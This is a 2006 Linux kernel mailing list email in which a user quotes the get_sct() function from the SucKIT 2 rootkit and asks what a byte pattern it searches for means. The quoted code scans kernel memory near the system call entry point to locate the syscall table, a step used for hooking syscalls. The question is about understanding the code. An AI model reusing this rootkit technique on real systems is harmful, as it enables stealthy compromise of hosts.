Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1751208AbWDFBie@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751208AbWDFBie (ORCPT <rfc822;willy@w.ods.org>);
	Wed, 5 Apr 2006 21:38:34 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751250AbWDFBie
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 5 Apr 2006 21:38:34 -0400
Received: from wproxy.gmail.com ([64.233.184.236]:59001 "EHLO wproxy.gmail.com")
	by vger.kernel.org with ESMTP id S1751208AbWDFBie convert rfc822-to-8bit
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Wed, 5 Apr 2006 21:38:34 -0400
DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
        s=beta; d=gmail.com;
        h=received:message-id:date:from:to:subject:mime-version:content-type:content-transfer-encoding:content-disposition;
        b=YT3udQ+Y9oR46XL+N+5D3LTZLZC4Xq7EzUkIueJbCTQpbc2CzW5hUKpxHNHSWlHPekcBrwEL4/iPlzMVOGXOt20xzFUn15/1A8b6KHpRF+tNMSCpBv/J+iqnlrRjqujpeKnEoKurFiE9VeJiLJ/yS5l4Lu95q8Gn0aq+OVMEGg0=
Message-ID: <6ff3e7140604051838k1b332990i488f373aad99fa71@mail.gmail.com>
Date: Thu, 6 Apr 2006 09:38:33 +0800
From: "openbsd shen" <openbsd.shen@gmail.com>
To: kernel <linux-kernel@vger.kernel.org>
Subject: What means "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7BIT
Content-Disposition: inline
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

this code from get_sct() of suckit 2, why memmem()
"\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"use, what it want to find?
The get_sct() founction:

ulong   get_sct()
{
        uchar   code[SCLEN+256];
        uchar   *p, *pt;
        ulong   r;
        uchar   pt_off, pt_bit;
        int     i;

        kernel_old80 = get_ep();

        if (!kernel_old80)
                return 0;
        if (rkm(code, sizeof(code), kernel_old80-4) <= 0)
                return 0;

        if (!memcmp(code, "PUNK", 4))
                return 0;

        p = (char *) memmem(code, SCLEN, "\xff\x14\x85", 3);
        if (!p) return 0;

        pt = (char *) memmem(p+7, SCLEN-(p-code)-7,
                "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8", 9);
        /* when run at here , it always return 0 */
        if (!pt) {
                eprintf("pt = %s\n", pt);
                return 0;
        }

        sc.trace = *((ulong *) (pt + 9));
        sc.trace += kernel_old80 + (pt - code) - 4 + 9 + 4;

        pt = (char *) memmem(p+7, SCLEN-(p-code)-7, "\xff\x14\x85", 3);
        if (!pt) return 0;

        for (i = 0; i < (p-code); i++) {
                if ((code[i] == 0xf6) && (code[i+1] == 0x43) &&
                    (code[i+4] == 0x75) && (code[i+2] < 127)) {
                        pt_off = code[i+2];
                        pt_bit = code[i+3];
                        goto cc;
                }
        }

        return 0;
}
